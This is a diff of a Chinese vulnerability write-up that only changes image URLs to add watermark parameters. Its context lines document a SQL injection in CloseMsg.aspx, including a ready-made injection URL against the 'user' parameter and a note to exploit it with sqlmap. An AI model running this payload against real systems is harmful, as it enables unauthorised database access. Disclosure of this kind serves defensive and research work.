@@ -20,7 +20,7 @@
 
 登录页面如下
 
-![](D:\知识星球\image\ql-1-1621166871878.png)
+![](D:\知识星球\image\ql-1-1621166871878.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 存在SQL注入的文件为 CloseMsg.aspx 
 
@@ -30,11 +30,11 @@ http://xxx.xxx.xxx.xxx/client/CloseMsg.aspx?user=' and (select db_name())>0--&pw
 
 
 
-![](http://wikioss.peiqi.tech/vuln/ql-6.png)
+![](http://wikioss.peiqi.tech/vuln/ql-6.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 使用SQLmap对参数 user 进行注入
 
-![](http://wikioss.peiqi.tech/vuln/ql-7.png)
+![](http://wikioss.peiqi.tech/vuln/ql-7.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ## Goby & POC
 
